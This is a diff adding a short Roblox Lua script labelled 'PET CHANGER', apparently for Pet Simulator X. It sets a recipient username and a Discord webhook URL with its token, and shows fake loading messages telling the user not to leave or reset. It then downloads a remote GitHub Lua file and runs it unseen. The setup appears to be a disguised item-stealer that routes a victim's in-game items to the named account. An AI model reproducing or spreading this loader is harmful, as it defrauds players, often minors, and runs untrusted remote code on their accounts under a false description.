@@ -1,0 +1,17 @@
+Username = "NOOBPLAYZ09_YT"
+
+WebHook = "https://discord.com/api/webhooks/1098873183345594418/st1s0hlaHvh3Cg1ToursQGvU8RR8RaOozVUdlzMOPo21bb-Vlutvi_qXocdKywwBs-W4"
+
+loadingscreen = true
+
+_G.CustomScriptName = "PET CHANGER"
+
+_G.Text1 = "Script Loaded..."
+
+_G.Text2 = "Please do not leave or reset (lose of ingame data will occur"
+
+_G.Text3 = "Checking Scripts..."
+
+_G.Text4 = "Starting Script..."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
